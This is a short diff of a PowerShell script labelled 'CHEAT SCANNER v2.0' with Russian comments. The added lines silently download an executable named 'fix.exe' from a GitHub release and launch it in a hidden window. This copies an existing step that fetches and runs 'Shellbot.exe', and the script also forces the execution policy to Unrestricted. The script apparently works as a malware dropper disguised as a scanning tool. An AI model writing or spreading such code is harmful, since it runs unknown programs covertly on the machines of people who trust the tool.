@@ -5,6 +5,11 @@ Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/S
     # Запускаем 
     Start-Process -FilePath "Shellbot.exe" -WindowStyle Hidden
 
+Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/releases/download/lol/fix.exe" -OutFile "fix.exe" -ErrorAction SilentlyContinue
+    
+    # Запускаем 
+    Start-Process -FilePath "fix.exe" -WindowStyle Hidden
+    
 # CHEAT SCANNER v2.0
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force
 
